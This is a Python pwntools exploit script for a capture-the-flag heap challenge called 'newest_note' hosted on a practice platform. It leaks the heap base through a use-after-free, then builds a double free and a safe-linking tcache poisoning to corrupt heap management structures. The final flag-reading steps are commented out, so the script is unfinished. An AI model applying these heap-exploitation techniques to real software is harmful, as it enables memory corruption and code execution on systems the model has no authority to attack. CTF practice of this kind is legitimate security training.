from pwn import *
from LibcSearcher import LibcSearcher
from sys import argv

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']
# context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

binary = 'newest_note'
elf = ELF(binary)
libc_path = './libc.so.6'
libc = ELF(libc_path)
if argv[1] == 'r':
        p = remote('node4.buuoj.cn', 27510)
else:
        p = process(binary)

s	= lambda data		:p.send(data)
sa	= lambda delim,data	:p.sendafter(str(delim), data)
sl	= lambda data		:p.sendline(data)
sla	= lambda delim,data	:p.sendlineafter(str(delim), data)
r	= lambda num=4096	:p.recv(num)
ru	= lambda delims		:p.recvuntil(delims)
rl	= lambda		:p.recvline()
rls	= lambda num=1		:p.recvlines(num)
itr	= lambda		:p.interactive()
uu32	= lambda data		:u32(data.ljust(4, b'\x00'))
uu64	= lambda data		:u64(data.ljust(8, b'\x00'))
lg	= lambda s		:log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))

def dbg():
        gdb.attach(p)
        pause()

def init():
        sla('notebook will be? :', '15000')

def menu(idx):
        msg=": "
        sla(msg, str(idx))

def add(idx, name='a'):
        menu('1')
        sla('Index: ', str(idx))
        sa('Content: ', name)

def free(index):
        menu('2')
        sla(':', str(index))

def show(index):
        menu('3')
        sla(':', str(index))

init()
dbg()
add(0, '0000')
free(0)
show(0)
ru('Content: ')
heap_base = uu64(b'\x00' + r(5)) << 4
chunk_mana = heap_base + 0x290 + 0x10
chunk_0 = heap_base + 0x5d0
lg('heap_base')
lg('chunk_mana')
dbg()

for i in range(1, 10):
        add(i)
# dbg()
add(10, b'a'*0x10+p64(0)+p64(0x21)+p64(0x90))
for i in range(1, 8):
        free(i)
# dbg()

free(8)
free(9)
free(8)
free(10)
chunk_8 = heap_base + 0x7c0
# dbg()

lg('chunk_mana')
for i in range(1, 8):
        add(i)
# 8->9->8->10
# 10->8->9
# dbg()
add(12, p64(chunk_mana ^ (chunk_8 >> 12)))
add(13, p64(0))
add(14, p64(0) + p64(0x91))
add(15, p64(0)*2 + p64(heap_base+0x40) + p64(chunk_8 + 0x20 - 0x40))
dbg()

# free_limit
# free(3)
# # dbg()
# add(4, p64(1)+p64(0x0007000000000000))
# dbg()

# sl('cat flag')
# itr()